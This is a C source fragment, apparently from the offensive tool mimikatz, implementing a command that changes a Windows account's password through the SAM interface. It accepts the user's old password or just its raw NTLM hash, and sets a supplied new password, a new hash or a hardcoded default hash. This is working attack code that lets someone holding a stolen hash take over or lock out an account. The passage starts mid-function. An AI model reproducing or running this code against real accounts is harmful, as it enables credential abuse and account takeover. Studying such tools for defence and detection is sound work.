	LSA_UNICODE_STRING serverName, userName, password;
	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
	DWORD i, domainEnumerationContext = 0, domainCountRetourned, *pRid = NULL, *pUse = NULL;
	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
	PSID domainSid;
	PCWCHAR szUser, szServer = NULL, szPassword;
	BYTE oldNtlm[LM_NTLM_HASH_LENGTH], newNtlm[LM_NTLM_HASH_LENGTH] = {0x60, 0xba, 0x4f, 0xca, 0xdc, 0x46, 0x6c, 0x7a, 0x03, 0x3c, 0x17, 0x81, 0x94, 0xc0, 0x3d, 0xf6}, emptyLM[LM_NTLM_HASH_LENGTH] = {0};

	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
	{
		RtlInitUnicodeString(&userName, szUser);
		kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL);
		RtlInitUnicodeString(&serverName, szServer ? szServer : L"");
		kprintf(L"Target server: %wZ\n", &serverName);
		kprintf(L"Target user  : %wZ\n", &userName);
		
		
		if(kull_m_string_args_byName(argc, argv, L"oldpassword", &szPassword, NULL))
		{
			RtlInitUnicodeString(&password, szPassword);
			status0 = RtlDigestNTLM(&password, oldNtlm);
			if(!NT_SUCCESS(status0))
				PRINT_ERROR(L"Unable to digest NTLM hash from old password: %08x\n", status0);
		}
		else if(kull_m_string_args_byName(argc, argv, L"oldntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"old", &szPassword, NULL))
		{
			status0 = kull_m_string_stringToHex(szPassword, oldNtlm, sizeof(oldNtlm)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
			if(!NT_SUCCESS(status0))
				PRINT_ERROR(L"Unable to convert \'%s\' to old NTLM hash (16 bytes)\n", szPassword);
		}
		else PRINT_ERROR(L"Argument /oldpassword: or /oldntlm: is needed\n");


		if(kull_m_string_args_byName(argc, argv, L"newpassword", &szPassword, NULL))
		{
			RtlInitUnicodeString(&password, szPassword);
			status1 = RtlDigestNTLM(&password, newNtlm);
			if(!NT_SUCCESS(status1))
				PRINT_ERROR(L"Unable to digest NTLM hash from new password: %08x\n", status0);
		}
		else if(kull_m_string_args_byName(argc, argv, L"newntlm", &szPassword, NULL) || kull_m_string_args_byName(argc, argv, L"new", &szPassword, NULL))
		{
			status1 = kull_m_string_stringToHex(szPassword, newNtlm, sizeof(newNtlm)) ? STATUS_SUCCESS : STATUS_WRONG_PASSWORD;
			if(!NT_SUCCESS(status1))
				PRINT_ERROR(L"Unable to convert \'%s\' to new NTLM hash (16 bytes)\n", szPassword);
		}
		else
		{
			kprintf(L"** No new credentials provided, will use the default one **\n");
			status1 = STATUS_SUCCESS;
		}

		if(NT_SUCCESS(status0) && NT_SUCCESS(status1))
		{
			kprintf(L"OLD NTLM     : ");
			kull_m_string_wprintf_hex(oldNtlm, sizeof(oldNtlm), 0);
			kprintf(L"\nNEW NTLM     : ");
			kull_m_string_wprintf_hex(newNtlm, sizeof(newNtlm), 0);
			kprintf(L"\n\n");
			status0 = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
			if(NT_SUCCESS(status0))
			{
				do
				{
					status1 = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
					if(NT_SUCCESS(status1) || status1 == STATUS_MORE_ENTRIES)
					{
						for(i = 0; i < domainCountRetourned; i++)
						{
							if(RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
								continue;
							kprintf(L"Domain name  : %wZ\n", &pEnumDomainBuffer[i].Name);
							status0 = SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &domainSid);
							if(NT_SUCCESS(status0))
							{
								kprintf(L"Domain SID   : ");
								kull_m_string_displaySID(domainSid);
								kprintf(L"\n");
								status0 = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);
								if(NT_SUCCESS(status0))
								{
									status0 = SamLookupNamesInDomain(hDomainHandle, 1, &userName, &pRid, &pUse);
									if(NT_SUCCESS(status0))
									{
										kprintf(L"User RID     : %u\n", pRid[0]);
										status0 = SamOpenUser(hDomainHandle, USER_CHANGE_PASSWORD, pRid[0], &hUserHandle);
										if(NT_SUCCESS(status0))
										{
											status0 = SamiChangePasswordUser(hUserHandle, FALSE, emptyLM, emptyLM, TRUE, oldNtlm, newNtlm);
											if(NT_SUCCESS(status0))
												kprintf(L"\n>> Change password is a success!\n");
											else if(status0 == STATUS_WRONG_PASSWORD)
												PRINT_ERROR(L"Bad old NTLM hash or password!\n");
											else if(status0 == STATUS_PASSWORD_RESTRICTION)
												PRINT_ERROR(L"Bad new NTLM hash or password! (restriction)\n");
											else PRINT_ERROR(L"SamiChangePasswordUser: %08x\n", status0);
											SamCloseHandle(hUserHandle);
										}
										else PRINT_ERROR(L"SamOpenUser: %08x\n", status0);
										SamFreeMemory(pRid);
										SamFreeMemory(pUse);
									}
									else PRINT_ERROR(L"SamLookupNamesInDomain: %08x\n", status0);
									SamCloseHandle(hDomainHandle);
								}
								else PRINT_ERROR(L"SamOpenDomain: %08x\n", status0);
								SamFreeMemory(domainSid);
							}
							else PRINT_ERROR(L"SamLookupDomainInSamServer: %08x\n", status0);
						}
						SamFreeMemory(pEnumDomainBuffer);
					}
					else PRINT_ERROR(L"SamEnumerateDomainsInSamServer: %08x\n", status1);
				}
				while(status1 == STATUS_MORE_ENTRIES);
				SamCloseHandle(hServerHandle);
			}
			else PRINT_ERROR(L"SamConnect: %08x\n", status0);
		}
	}
	else PRINT_ERROR(L"Argument /user: is needed\n");
	return STATUS_SUCCESS;
}